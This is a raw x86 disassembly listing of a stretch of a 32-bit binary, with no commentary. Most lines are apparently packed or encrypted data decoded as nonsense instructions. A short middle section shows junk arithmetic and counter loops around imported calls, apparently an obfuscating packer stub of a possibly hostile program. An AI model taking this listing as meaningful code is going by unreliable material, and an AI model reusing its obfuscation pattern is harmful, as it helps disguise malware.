  405756:	sbb    bh,BYTE PTR [eax+0x512362d8]
  40575c:	jmp    0x405741
  40575e:	mov    cl,0x6a
  405760:	rcr    dl,1
  405762:	shl    DWORD PTR [edi+0x3e],0x13
  405766:	xor    al,0x98
  405768:	inc    eax
  405769:	(bad)  
  40576b:	es inc esi
  40576d:	fst    QWORD PTR fs:[ebx]
  405770:	popf   
  405771:	js     0x405729
  405773:	push   0xffffffb0
  405775:	or     edi,ecx
  405777:	sbb    dh,BYTE PTR [ecx+0x395574a2]
  40577d:	and    esp,DWORD PTR [ecx]
  40577f:	clc    
  405780:	xchg   edi,eax
  405781:	xor    DWORD PTR [edi-0x490ccf8a],ebp
  405787:	cdq    
  405788:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405789:	pop    ebp
  40578a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40578b:	mov    ?,WORD PTR [esi-0xb]
  40578e:	push   esp
  40578f:	out    dx,al
  405790:	sbb    esi,DWORD PTR [ebp+0x39]
  405793:	jmp    0xa2bb66c5
  405798:	push   ss
  405799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40579a:	mov    edx,0x6be7d57a
  40579f:	add    al,0x49
  4057a1:	ror    BYTE PTR [edx-0x65d05069],cl
  4057a7:	enter  0x1a18,0x7e
  4057ab:	cdq    
  4057ac:	cvtpi2ps xmm1,QWORD PTR [eax+0x66]
  4057b0:	js     0x4057a7
  4057b2:	retf   0x9aef
  4057b5:	stc    
  4057b6:	pushf  
  4057b7:	push   es
  4057b8:	pop    edx
  4057b9:	ins    DWORD PTR es:[edi],dx
  4057ba:	pop    ebp
  4057bb:	xchg   esi,eax
  4057bc:	jmp    0x405823
  4057be:	mov    BYTE PTR [esi-0x257febcb],bh
  4057c4:	ins    BYTE PTR es:[edi],dx
  4057c5:	xor    bl,BYTE PTR [ebp-0x18eaaf73]
  4057cb:	jmp    0xd5cfe4d
  4057d0:	cmp    esi,DWORD PTR [eax]
  4057d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4057d3:	mov    al,ds:0xe18764da
  4057d8:	repz adc DWORD PTR [ecx-0x7496fec8],0xffffffb6
  4057e0:	daa    
  4057e1:	fs pop ds
  4057e3:	xchg   edx,eax
  4057e4:	cwd    
  4057e6:	pusha  
  4057e7:	ins    BYTE PTR es:[edi],dx
  4057e8:	pop    ds
  4057e9:	cdq    
  4057ea:	ret    0xe25a
  4057ed:	ret    
  4057ee:	jns    0x4057b2
  4057f0:	and    eax,DWORD PTR [ebp-0x6e4c7939]
  4057f6:	rcl    DWORD PTR [ebp+ebp*8+0x5acb0f8e],cl
  4057fd:	lock pand mm2,QWORD PTR [edx]
  405801:	or     al,0xb4
  405803:	(bad)
  405807:	pop    es
  405808:	and    esi,edx
  40580a:	adc    DWORD PTR [edx+0x41149afc],eax
  405810:	pop    eax
  405811:	arpl   WORD PTR [ebx+0x59597cf3],cx
  405817:	ds inc eax
  405819:	pushf  
  40581a:	mov    ecx,0xb66317b1
  40581f:	jno    0x405866
  405821:	sbb    DWORD PTR [edx],0xffffff82
  405824:	push   edx
  405825:	xchg   esi,eax
  405826:	inc    ecx
  405827:	outs   dx,DWORD PTR ds:[esi]
  405828:	aad    0xe1
  40582a:	push   ecx
  40582b:	aad    0x16
  40582d:	and    cl,dl
  40582f:	xchg   ch,ch
  405831:	cwde   
  405832:	cmp    al,0x39
  405834:	cmp    bh,BYTE PTR [edx+0x50]
  405837:	jp     0x405888
  405839:	inc    esi
  40583a:	push   esi
  40583b:	ins    BYTE PTR es:[edi],dx
  40583c:	scas   eax,DWORD PTR es:[edi]
  40583d:	jnp    0x405870
  40583f:	(bad)  
  405840:	not    BYTE PTR [ecx]
  405842:	test   DWORD PTR [ecx+0x135f1cb4],ecx
  405848:	and    ch,BYTE PTR [ebp-0x27]
  40584b:	mov    BYTE PTR ds:0xb001bb2a,ch
  405851:	jno    0x4057f8
  405853:	fsub   DWORD PTR [edi-0x79]
  405856:	push   cs
  405857:	or     bh,ah
  405859:	repnz or DWORD PTR [ecx],edi
  40585c:	adc    ecx,edi
  40585e:	out    0x73,eax
  405860:	adc    eax,0xd86438e0
  405865:	jecxz  0x405886
  405867:	cmp    BYTE PTR [esi-0x61],dh
  40586a:	fidivr DWORD PTR [esi+0x5b]
  40586d:	jg     0x4057f6
  40586f:	mov    ebp,0xe84da870
  405874:	into   
  405875:	jl     0x405804
  405877:	sbb    BYTE PTR [edx-0x61],ah
  40587a:	cwde   
  40587b:	sub    DWORD PTR [esi-0x1a7c1051],esp
  405881:	and    ebp,DWORD PTR [ebx+edi*1+0x7436537b]
  405888:	shl    ebx,0x26
  40588b:	fmul   st,st(2)
  40588d:	(bad)  [eax+0x7c]
  405890:	cmp    DWORD PTR [ebp+0x53d19715],ecx
  405896:	int3   
  405897:	and    edx,edx
  405899:	in     al,0xf6
  40589b:	icebp  
  40589c:	test   DWORD PTR [edi],esp
  40589e:	in     al,0x1f
  4058a0:	dec    esi
  4058a1:	repz push ebp
  4058a3:	repz ret 
  4058a5:	and    al,0x35
  4058a7:	add    eax,0x4196b7fa
  4058ac:	mov    esi,0x7c0b78e9
  4058b1:	scas   eax,DWORD PTR es:[edi]
  4058b2:	test   DWORD PTR [ebp-0x664a5963],ebx
  4058b8:	cdq    
  4058b9:	test   eax,0x3d597f95
  4058be:	imul   ebx,DWORD PTR [ecx+0x32f98a4e],0xd2e3629c
  4058c8:	xchg   edi,eax
  4058c9:	sbb    edi,DWORD PTR [edi-0x64]
  4058cc:	cs stos BYTE PTR es:[edi],al
  4058ce:	in     eax,0xa6
  4058d0:	into   
  4058d1:	dec    eax
  4058d2:	call   0xc595f48
  4058d7:	cmp    bh,al
  4058d9:	pushf  
  4058da:	retf   
  4058db:	jno    0x405911
  4058dd:	mov    edx,DWORD PTR [esi]
  4058df:	out    0xe0,al
  4058e1:	rcr    BYTE PTR [edx+0x6ddad264],1
  4058e7:	adc    edi,DWORD PTR [esi]
  4058e9:	xchg   ebx,eax
  4058ea:	or     esi,DWORD PTR [eax+0x2d]
  4058ed:	out    dx,eax
  4058ee:	mov    ebp,0x5c9fc01d
  4058f3:	pop    ecx
  4058f4:	test   DWORD PTR [eax],0x9ff4a49f
  4058fa:	sbb    DWORD PTR [edi+esi*4+0x690f1999],ebx
  405901:	cmp    ebp,DWORD PTR [edx+0x16e26603]
  405907:	or     DWORD PTR [ebx-0x15],esi
  40590a:	inc    BYTE PTR [edx]
  40590c:	stos   DWORD PTR es:[edi],eax
  40590d:	out    0x14,eax
  40590f:	jnp    0x40589e
  405911:	aas    
  405912:	xchg   edx,eax
  405913:	pop    edi
  405914:	(bad)  
  405915:	xchg   esp,eax
  405916:	aam    0x70
  405918:	jge    0x40598a
  40591a:	rol    BYTE PTR [eax+edx*4],1
  40591d:	dec    ebp
  40591e:	(bad)  
  405920:	pop    esi
  405921:	lea    ebp,[ecx+esi*8]
  405924:	xchg   edx,eax
  405925:	lahf   
  405926:	je     0x40597a
  405928:	sub    eax,0x7a4bc54f
  40592d:	lods   eax,DWORD PTR ds:[esi]
  40592e:	mov    al,ds:0x21b77d38
  405933:	cld    
  405934:	mov    cl,0x64
  405936:	in     al,0x2e
  405938:	in     al,0x56
  40593a:	mov    ?,edx
  40593c:	dec    edx
  40593d:	sub    bh,bh
  40593f:	xor    al,BYTE PTR [ecx]
  405941:	push   ecx
  405942:	stos   DWORD PTR es:[edi],eax
  405943:	push   0xffffff93
  405945:	xor    eax,0xe4bd6145
  40594a:	das    
  40594b:	shl    esp,1
  40594d:	push   es
  40594e:	lods   eax,DWORD PTR ds:[esi]
  40594f:	daa    
  405950:	loopne 0x405912
  405952:	mov    ch,0xb1
  405954:	adc    esi,DWORD PTR [ecx+0x6ea9fa36]
  40595a:	or     DWORD PTR [edx],esi
  40595c:	xchg   ebx,eax
  40595d:	jne    0x405956
  40595f:	in     al,dx
  405960:	shl    dl,0xc2
  405963:	rdtsc  
  405965:	outs   dx,BYTE PTR ds:[esi]
  405966:	dec    ecx
  405967:	shl    DWORD PTR [eax+ecx*4],0xc2
  40596b:	mov    al,ds:0x81b5dcfd
  405970:	addr16 popa 
  405972:	lea    edi,[ebp+0x4b]
  405975:	pop    ebp
  405976:	or     esp,edx
  405978:	js     0x405932
  40597a:	shl    BYTE PTR [edi-0x4e4068a2],1
  405980:	loope  0x40593c
  405982:	and    eax,0x9497ea43
  405987:	jo     0x405953
  405989:	pusha  
  40598a:	cmp    al,0xd9
  40598c:	fadd   DWORD PTR [esi]
  40598e:	icebp  
  40598f:	daa    
  405990:	jb     0x405946
  405992:	inc    edi
  405993:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405994:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405995:	pop    eax
  405996:	iret   
  405997:	mov    WORD PTR [edx-0x55],?
  40599a:	and    esi,ebp
  40599c:	add    eax,0x519fd4f1
  4059a1:	(bad)  
  4059a2:	(bad)  
  4059a3:	fiadd  WORD PTR [eax-0x11]
  4059a6:	inc    edx
  4059a7:	mov    ?,WORD PTR [ecx+0x22]
  4059aa:	mov    eax,0xd228af36
  4059af:	test   BYTE PTR ds:0x51df74d6,0x35
  4059b6:	(bad)  
  4059b8:	arpl   si,ax
  4059ba:	or     bl,BYTE PTR [edx-0x6]
  4059bd:	lds    eax,FWORD PTR [ebx]
  4059bf:	or     DWORD PTR [ebp-0x1f],eax
  4059c2:	mov    al,ds:0x119f4ae
  4059c7:	mov    edi,0x239ae539
  4059cc:	push   ds
  4059cd:	pop    ecx
  4059ce:	mov    BYTE PTR [esi+0x32],dh
  4059d1:	xchg   BYTE PTR [ebp+0x1c],ch
  4059d4:	mov    dl,0x73
  4059d6:	or     eax,0x95892f98
  4059db:	and    cl,al
  4059dd:	xor    WORD PTR [esp+eax*1],si
  4059e1:	adc    eax,0xb2943e76
  4059e6:	mov    eax,ds:0x99e97855
  4059eb:	pusha  
  4059ec:	xchg   esp,eax
  4059ed:	xchg   edx,eax
  4059ee:	inc    edx
  4059ef:	xchg   ecx,eax
  4059f0:	mov    bl,0x7e
  4059f2:	inc    esi
  4059f3:	dec    edi
  4059f4:	test   DWORD PTR [edi+0x50],eax
  4059f7:	mov    eax,DWORD PTR [ebp+0x1ac33848]
  4059fd:	mov    eax,0x33ef4182
  405a02:	jmp    0x405a81
  405a04:	iret   
  405a05:	xchg   esp,eax
  405a06:	mov    dh,cl
  405a08:	mov    cl,0xd6
  405a0a:	sub    BYTE PTR [edx+ebx*8+0x52],dh
  405a0e:	sti    
  405a0f:	in     al,0x4a
  405a11:	mov    WORD PTR [esi-0x78],?
  405a14:	out    0x23,eax
  405a16:	ds cmp eax,0xe3360ea9
  405a1c:	mov    cl,0x29
  405a1e:	std    
  405a1f:	sti    
  405a20:	jmp    0xba9aa42
  405a25:	retf   
  405a26:	aam    0xaa
  405a28:	mov    ebx,0xbe713a9
  405a2d:	jo     0x405a55
  405a2f:	clc    
  405a30:	pusha  
  405a31:	repz popa 
  405a33:	(bad)  
  405a34:	retf   
  405a35:	ja     0x405ab5
  405a37:	push   ss
  405a38:	mov    cs,WORD PTR [edx]
  405a3a:	pop    ecx
  405a3b:	xchg   ebp,eax
  405a3c:	cmp    dl,BYTE PTR [ecx]
  405a3e:	mov    bl,0x4b
  405a40:	pop    edx
  405a41:	(bad)
  405a45:	int    0x32
  405a47:	or     eax,0xbbc72726
  405a4c:	test   al,bl
  405a4e:	jecxz  0x405acd
  405a50:	pop    ds
  405a51:	push   ebp
  405a52:	int3   
  405a53:	aam    0xdf
  405a55:	adc    ah,BYTE PTR [edx]
  405a57:	or     al,al
  405a59:	or     eax,0x30176b8b
  405a5e:	dec    ecx
  405a5f:	out    0xb0,al
  405a61:	lea    edi,[ebx-0x40]
  405a64:	mov    ecx,0xf2ad8f51
  405a69:	add    ch,dl
  405a6b:	push   ebx
  405a6c:	cmp    ebp,ecx
  405a6e:	push   edx
  405a6f:	adc    eax,0x9303738a
  405a74:	nop
  405a75:	xchg   edx,eax
  405a76:	mov    eax,0x51d1a095
  405a7b:	jmp    0x405a4f
  405a7d:	sti    
  405a7e:	adc    bl,BYTE PTR [edi-0x2f]
  405a81:	imul   edi,DWORD PTR [edx],0xc9ee35e5
  405a87:	xchg   cl,ch
  405a89:	jae    0x405ae8
  405a8b:	sub    ah,BYTE PTR [ecx]
  405a8d:	and    al,0x4a
  405a8f:	ins    BYTE PTR es:[edi],dx
  405a90:	jo     0x405a14
  405a92:	pushf  
  405a93:	out    dx,al
  405a94:	cwde   
  405a95:	push   ds
  405a96:	fcmovb st,st(0)
  405a98:	inc    esi
  405a99:	ret    
  405a9a:	mov    ch,0x30
  405a9c:	les    esp,FWORD PTR [ecx+0x6e377721]
  405aa2:	aam    0x3e
  405aa4:	loop   0x405aca
  405aa6:	jns    0x405a87
  405aa8:	sbb    BYTE PTR [edx-0x30886fa4],cl
  405aae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405aaf:	xor    BYTE PTR [ecx+0x6],bl
  405ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ab3:	ret    
  405ab4:	in     eax,0x26
  405ab6:	(bad)  
  405ab7:	adc    al,0x4
  405ab9:	cmp    BYTE PTR [edi-0x3d],cl
  405abc:	test   al,0x98
  405abe:	shr    cl,0x0
  405ac1:	(bad)  
  405ac2:	out    dx,eax
  405ac3:	and    al,0xe0
  405ac5:	pushf  
  405ac6:	mov    dl,0x42
  405ac8:	push   edx
  405ac9:	(bad)  
  405aca:	rol    DWORD PTR [edi+0x28],1
  405acd:	fld    QWORD PTR [esi+ecx*1]
  405ad0:	push   0xffffffd2
  405ad2:	mov    ch,0x6e
  405ad4:	and    DWORD PTR [ecx+0x0],esi
  405ad7:	pop    ss
  405ad8:	je     0x405b47
  405ada:	jecxz  0x405b2a
  405adc:	leave  
  405add:	inc    ebp
  405ade:	jb     0x405a79
  405ae0:	cld    
  405ae1:	ror    ah,0x95
  405ae4:	jne    0x405aab
  405ae6:	cli    
  405ae7:	mov    eax,0xd47b11fd
  405aec:	in     eax,0x84
  405aee:	sbb    DWORD PTR cs:[ebp-0x5743a334],edx
  405af5:	or     BYTE PTR [ecx+ebx*4-0x37],dl
  405af9:	sbb    eax,DWORD PTR [eax-0x47]
  405afc:	mov    ecx,0x8c5c8551
  405b01:	push   ebx
  405b02:	inc    ecx
  405b03:	popa   
  405b04:	sub    eax,0xb783b0e3
  405b09:	and    BYTE PTR [esp+ecx*1-0x39],bl
  405b0d:	jae    0x405b18
  405b0f:	icebp  
  405b10:	in     eax,0x96
  405b12:	inc    edi
  405b13:	push   edi
  405b14:	or     bl,ch
  405b16:	repz aad 0x38
  405b19:	daa    
  405b1a:	jb     0x405ad3
  405b1c:	lods   al,BYTE PTR ds:[esi]
  405b1d:	push   ds
  405b1e:	cmc    
  405b1f:	(bad)  
  405b20:	pop    esi
  405b21:	or     edx,ecx
  405b23:	ds cmp eax,0xb770d6d
  405b29:	mov    cl,0x3f
  405b2b:	cwde   
  405b2c:	sbb    DWORD PTR [edx],edx
  405b2e:	pop    esp
  405b2f:	test   al,0xdb
  405b31:	jbe    0x405b56
  405b33:	aam    0x20
  405b35:	and    al,0x40
  405b37:	push   eax
  405b38:	inc    dl
  405b3a:	pop    esp
  405b3b:	xchg   esi,eax
  405b3c:	fcom   DWORD PTR [ebx+0x3a7c0a70]
  405b42:	inc    edi
  405b43:	xor    DWORD PTR [ebp+0x320b2077],edx
  405b49:	test   BYTE PTR [esi+0x35],cl
  405b4c:	cmp    BYTE PTR [edi],dl
  405b4e:	arpl   WORD PTR [ecx+0x5366a6f0],sp
  405b54:	mov    bh,0x94
  405b56:	mov    ebp,0xc10c6790
  405b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405b5c:	push   ebp
  405b5d:	(bad)  
  405b5e:	sub    al,0x83
  405b60:	loope  0x405af4
  405b62:	sub    eax,0xe904492
  405b67:	lea    ecx,[ebx-0x49]
  405b6a:	mov    ah,0x7a
  405b6c:	push   edx
  405b6d:	in     al,0x3f
  405b6f:	retf   0xe027
  405b72:	bound  esi,QWORD PTR [eax-0x784f9c66]
  405b78:	repnz pop es
  405b7a:	iret   
  405b7b:	lods   al,BYTE PTR ds:[esi]
  405b7c:	add    DWORD PTR [esi+0x392aa0d3],0xfffffff6
  405b83:	(bad)  
  405b85:	push   edi
  405b86:	stos   BYTE PTR es:[edi],al
  405b87:	sar    BYTE PTR [esi-0x2bce166a],cl
  405b8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b8e:	stc    
  405b8f:	inc    edi
  405b90:	inc    ebx
  405b91:	call   0x5f71:0x8957775b
  405b98:	out    dx,eax
  405b99:	fimul  WORD PTR [ebx-0x7d]
  405b9c:	sbb    esp,DWORD PTR [edi]
  405b9e:	jl     0x405b79
  405ba0:	dec    ebx
  405ba1:	push   es
  405ba2:	cmc    
  405ba3:	add    BYTE PTR [ebp-0x3d31cbe9],ah
  405ba9:	mov    cl,0x53
  405bab:	cmp    eax,0x60b600f4
  405bb0:	fidiv  WORD PTR [ebp+0x14]
  405bb3:	outs   dx,DWORD PTR ds:[esi]
  405bb4:	cmp    DWORD PTR [ebx],edx
  405bb6:	call   0x2dbf603a
  405bbb:	pop    ds
  405bbc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bbd:	dec    ebp
  405bbe:	pop    esp
  405bbf:	add    esp,DWORD PTR [ebx+0x1c]
  405bc2:	push   ebp
  405bc3:	fldenv [ecx-0x7f]
  405bc6:	div    DWORD PTR [esi+edx*2]
  405bc9:	nop
  405bca:	pop    edx
  405bcb:	cmc    
  405bcc:	out    dx,eax
  405bcd:	cs mov ah,0xd7
  405bd0:	hlt    
  405bd1:	mov    DWORD PTR [eax+0x52],esi
  405bd4:	xchg   ebx,eax
  405bd5:	mov    esi,DWORD PTR [esi+0x62d6dedc]
  405bdb:	in     eax,dx
  405bdc:	popf   
  405bdd:	jg     0x405b88
  405bdf:	jp     0x405c07
  405be1:	sbb    esi,DWORD PTR [edx+0x55a82eaa]
  405be7:	call   0x1cf8:0xc5626c2b
  405bee:	int3   
  405bef:	shl    BYTE PTR [edi+edx*2+0x6eaf8c85],0x70
  405bf7:	jp     0x405b87
  405bf9:	fisubr WORD PTR [ebx+esi*1+0x573810cc]
  405c00:	iret   
  405c01:	aaa    
  405c02:	cdq    
  405c03:	fninit 
  405c05:	test   BYTE PTR [ebp-0x5969f4af],cl
  405c0b:	xchg   edx,esp
  405c0d:	inc    ebx
  405c0e:	cmp    DWORD PTR [ebp-0x3923ad48],esi
  405c14:	stos   BYTE PTR es:[edi],al
  405c15:	sub    edx,ebx
  405c17:	and    al,0xd1
  405c19:	outs   dx,DWORD PTR ds:[esi]
  405c1a:	mov    ecx,0xd1ceb9aa
  405c1f:	retf   0xd32e
  405c22:	aad    0x8
  405c24:	inc    edi
  405c25:	jmp    0x7399:0x5e117544
  405c2c:	xor    BYTE PTR [ebx],bh
  405c2e:	shl    BYTE PTR [edx+0x11],cl
  405c31:	xchg   edi,eax
  405c32:	push   edi
  405c33:	fcomp  DWORD PTR [edx]
  405c35:	pop    edi
  405c36:	adc    DWORD PTR [ebx-0x645271cb],edx
  405c3c:	sub    eax,ebx
  405c3e:	jmp    0xf4f63572
  405c43:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405c44:	mov    ?,WORD PTR [esi+0x3]
  405c47:	sub    eax,0xb7e4587a
  405c4c:	mov    eax,0x122f8279
  405c51:	mov    eax,ds:0xfbc39708
  405c56:	xchg   DWORD PTR [ecx+esi*2+0x3],edi
  405c5a:	mov    al,0xca
  405c5c:	pop    es
  405c5d:	mov    eax,ds:0x22a877db
  405c62:	js     0x405c4b
  405c64:	xchg   edi,eax
  405c65:	mov    ebx,0x7d38b762
  405c6a:	sbb    BYTE PTR [edi+0x5e],0xc9
  405c6e:	ret    
  405c6f:	push   ebp
  405c70:	mov    ebp,esp
  405c72:	sub    esp,0x58
  405c75:	add    DWORD PTR ds:0x429008,0x42b004
  405c7f:	push   ebx
  405c80:	adc    DWORD PTR ds:0x42a018,0x429010
  405c8a:	push   esi
  405c8b:	push   edi
  405c8c:	and    DWORD PTR ds:0x42c00c,0x6433
  405c96:	push   0x1f
  405c98:	lea    eax,[ebp-0x58]
  405c9b:	push   eax
  405c9c:	adc    DWORD PTR ds:0x42a010,0x6fdc
  405ca6:	push   0x0
  405ca8:	sub    DWORD PTR ds:0x42b018,0x7ba7
  405cb2:	call   DWORD PTR ds:0x424034
  405cb8:	call   DWORD PTR ds:0x424004
  405cbe:	and    DWORD PTR ds:0x42a000,0x4473
  405cc8:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  405ccf:	and    DWORD PTR ds:0x429018,0x0
  405cd9:	mov    ebx,DWORD PTR ds:0x429018
  405cdf:	inc    ebx
  405ce0:	mov    DWORD PTR ds:0x429018,ebx
  405ce6:	cmp    DWORD PTR ds:0x429018,0x1f
  405ced:	jne    0x405d03
  405cf3:	push   0x42b00c
  405cf8:	push   0x7f05
  405cfd:	call   DWORD PTR ds:0x42403c
  405d03:	cmp    DWORD PTR ds:0x429018,0x19
  405d0a:	jb     0x405cd9
  405d10:	add    ebx,DWORD PTR ds:0x42a008
  405d16:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  405d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  405d20:	mov    ebx,0x7510893
  405d25:	xor    ecx,ebx
  405d27:	or     DWORD PTR ds:0x42b00c,edx
  405d2d:	mov    eax,0x3272db
  405d32:	add    ecx,eax
  405d34:	sub    DWORD PTR ds:0x42a010,0x429004
  405d3e:	mov    DWORD PTR [ebp-0x1c],ecx
  405d41:	mov    ecx,DWORD PTR [ebp+0x14]
  405d44:	mov    DWORD PTR ds:0x42800c,0x25aa
  405d4e:	test   ecx,ecx
  405d50:	mov    DWORD PTR ds:0x428000,0x5e1a
  405d5a:	je     0x405d78
  405d60:	sub    DWORD PTR ds:0x42b018,0x6b15
  405d6a:	mov    ecx,DWORD PTR [ebp+0x14]
  405d6d:	mov    ecx,DWORD PTR [ecx]
  405d6f:	add    DWORD PTR ds:0x42a000,ecx
  405d75:	mov    DWORD PTR [ebp-0x1c],ecx
  405d78:	and    DWORD PTR ds:0x42a010,0x0
  405d82:	mov    edi,DWORD PTR ds:0x42a010
  405d88:	inc    edi
  405d89:	mov    DWORD PTR ds:0x42a010,edi
  405d8f:	cmp    DWORD PTR ds:0x42a010,0x9
  405d96:	jne    0x405daa
  405d9c:	push   DWORD PTR [ebp-0x14]
  405d9f:	push   0x423543
  405da4:	call   DWORD PTR ds:0x424040
  405daa:	cmp    DWORD PTR ds:0x42a010,0x8
  405db1:	jne    0x405dc4
  405db7:	mov    edi,DWORD PTR ds:0x42a010
  405dbd:	inc    edi
  405dbe:	mov    DWORD PTR ds:0x42a010,edi
  405dc4:	cmp    DWORD PTR ds:0x42a010,0x13
  405dcb:	jb     0x405d82
  405dd1:	mov    ecx,0x457a
  405dd6:	imul   edx,eax
  405dd9:	mov    esi,0x787f
  405dde:	or     DWORD PTR ds:0x428004,0x4238
  405de8:	add    edx,ecx
  405dea:	sbb    DWORD PTR ds:0x429014,0x4641
  405df4:	jmp    0x40819c
  405df9:	jecxz  0x405d80
  405dfb:	cmp    eax,0x636a9b92
  405e00:	sbb    esp,0xffffffb2
  405e03:	fild   WORD PTR [ecx-0x1a0b90f0]
  405e09:	push   edx
  405e0a:	cmp    esp,DWORD PTR [edx+0x62]
  405e0d:	neg    DWORD PTR [edi+0x62]
  405e10:	bound  ecx,QWORD PTR [ecx+0x1]
  405e13:	ror    bh,cl
  405e15:	xchg   DWORD PTR [ecx],edx
  405e17:	and    DWORD PTR [ebp-0x62],edx
  405e1a:	push   ds
  405e1b:	retf   0x113f
  405e1e:	mov    ds:0xe90d21b5,eax
  405e23:	gs inc ebx
  405e25:	lock ins BYTE PTR es:[edi],dx
  405e27:	popf   
  405e28:	cmp    ah,BYTE PTR [eax-0xa]
  405e2b:	adc    ebx,DWORD PTR [edx]
  405e2d:	int3   
  405e2e:	js     0xaefb72e7
  405e34:	mov    bh,0x6e
  405e36:	aaa    
  405e37:	cmc    
  405e38:	ja     0x405e15
  405e3a:	(bad)  [esi+0x33]
  405e3d:	inc    eax
  405e3e:	pop    esi
  405e3f:	push   ebp
  405e40:	lahf   
  405e41:	jge    0x405eae
  405e43:	and    DWORD PTR [ebx-0x175377f9],esi
  405e49:	xchg   esp,eax
  405e4b:	les    ebx,FWORD PTR [esp+ecx*4]
  405e4e:	and    eax,0xdd1720ef
  405e53:	out    0xf9,al
  405e55:	inc    ecx
  405e56:	clc    
  405e57:	les    ebx,FWORD PTR [ebp-0x32]
  405e5a:	loope  0x405eb0
  405e5c:	jne    0x405e1a
  405e5e:	jmp    0x405e37
  405e60:	push   ds
  405e61:	cmc    
  405e62:	adc    DWORD PTR [ecx-0x33],edx
  405e65:	outs   dx,DWORD PTR ds:[esi]
  405e66:	add    eax,0xa64bf34e
  405e6b:	sbb    BYTE PTR [ecx-0x78],0xc3
  405e6f:	cdq    
  405e70:	inc    eax
  405e71:	push   eax
  405e72:	push   esp
  405e73:	xchg   DWORD PTR [esi+0x57],eax
  405e76:	push   eax
  405e77:	dec    esi
  405e78:	sar    DWORD PTR [edi],cl
  405e7a:	jae    0x405eb4
  405e7c:	(bad)  
  405e7d:	icebp  
  405e7e:	jno    0x405e96
  405e80:	add    edi,DWORD PTR ds:0x14e70d97
  405e86:	fadd   st(3),st
  405e88:	push   edx
  405e89:	(bad)  [edx]
  405e8b:	jnp    0x405f06
  405e8d:	stos   BYTE PTR es:[edi],al
  405e8e:	mov    ebx,es
  405e90:	jl     0x405ec0
  405e92:	loop   0x405e41
  405e94:	push   eax
  405e95:	fwait
  405e96:	inc    ax
  405e98:	lahf   
  405e99:	dec    eax
  405e9a:	push   ebp
  405e9b:	in     al,0x4f
  405e9d:	push   ecx
  405e9e:	ror    BYTE PTR [edi+0x67],1
  405ea1:	inc    esp
  405ea2:	mov    eax,0x9cdb2b70
  405ea7:	adc    cl,BYTE PTR [edi+esi*8-0x53]
  405eab:	push   cs
  405eac:	mov    al,0x96
  405eae:	mov    ebp,0xb8d27ad0
  405eb3:	xlat   BYTE PTR ds:[ebx]
  405eb4:	inc    eax
  405eb5:	(bad)  
  405eb6:	jae    0x405e7f
  405eb8:	add    al,0xb8
  405eba:	sti    
  405ebb:	out    0x15,eax
  405ebd:	in     eax,0x9c
  405ebf:	into   
  405ec0:	test   eax,0xaf6f20d8
  405ec5:	and    BYTE PTR [edx-0x21ccf03],0xb
  405ecc:	push   esi
  405ecd:	stos   BYTE PTR es:[edi],al
  405ece:	or     eax,0x37e98a36
  405ed3:	jmp    0x453c:0x6d37b951
  405eda:	dec    ebp
  405edb:	fbld   TBYTE PTR [ebx-0x11fb0269]
  405ee1:	xchg   esp,eax
  405ee2:	sub    ch,BYTE PTR [eax+0x4c]
  405ee5:	pop    esp
  405ee6:	jp     0x405ec3
  405ee8:	dec    eax
  405ee9:	pop    esi
  405eea:	jle    0x405f0d
  405eec:	pop    ds
  405eed:	mov    ecx,0x653aeee4
  405ef2:	imul   ebp,DWORD PTR [ecx+0x313ca032],0xffffff94
  405ef9:	or     eax,DWORD PTR [edi]
  405efb:	mov    WORD PTR [edi],cs
  405efd:	nop
  405efe:	mov    esi,0xf6b7591b
  405f03:	outs   dx,BYTE PTR ds:[esi]
  405f04:	pushf  
  405f05:	rcl    BYTE PTR [ecx+eax*2-0x68],0x8c
  405f0a:	rcr    edx,0xea
  405f0d:	pop    ebx
  405f0e:	dec    ebx
  405f0f:	and    DWORD PTR [edx+0x19b6139a],eax
  405f15:	fcomi  st,st(4)
  405f17:	jp     0x405f82
  405f19:	jmp    0xc556:0xc551e756
  405f20:	cmp    al,0x91
  405f22:	xchg   BYTE PTR [ebp+0x6],cl
  405f25:	dec    eax
  405f26:	cld    
  405f27:	shufps xmm7,XMMWORD PTR [ecx+0x6ca54e0c],0xeb
  405f2f:	or     dl,BYTE PTR [edi+0x37]
  405f32:	xchg   ebx,eax
  405f33:	pop    ebx
  405f34:	(bad)  
  405f36:	pop    esi
  405f37:	repz cmovo esp,esp
  405f3b:	jecxz  0x405edf
  405f3d:	nop
  405f3e:	cmp    eax,0x6dbcc7cb
  405f43:	pop    edx
  405f44:	popf   
  405f45:	test   BYTE PTR [ebp+0x33336967],bh
  405f4b:	aas    
  405f4c:	rol    BYTE PTR [ecx-0x47ebbb4e],cl
  405f52:	xchg   BYTE PTR [ecx-0x48],al
  405f55:	inc    edi
  405f56:	pop    ebx
  405f57:	jmp    0x405f56
  405f59:	ret    0x999
  405f5c:	xlat   BYTE PTR ds:[ebx]
  405f5d:	sbb    BYTE PTR [edx],cl
  405f5f:	bound  eax,QWORD PTR [esi]
  405f61:	push   eax
  405f62:	jp     0x405eea
  405f64:	addr16 mov ah,0x86
  405f67:	lea    ecx,[ebx+0x67592e5a]
  405f6d:	push   es
  405f6e:	sti    
  405f6f:	inc    esi
  405f70:	fild   DWORD PTR [esi-0x25a0a297]
  405f76:	mov    edx,0x99bb765a
  405f7b:	xchg   ebx,eax
  405f7c:	pop    ebx
  405f7d:	push   ecx
  405f7e:	mov    bl,0xe0
  405f80:	std    
  405f81:	sub    DWORD PTR [ecx],ebp
  405f83:	in     al,0xc4
  405f85:	gs pop ebx
  405f87:	mov    bh,BYTE PTR [edx+0x5]
  405f8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f8b:	mov    BYTE PTR [eax-0x23],0xf2
  405f8f:	(bad)  
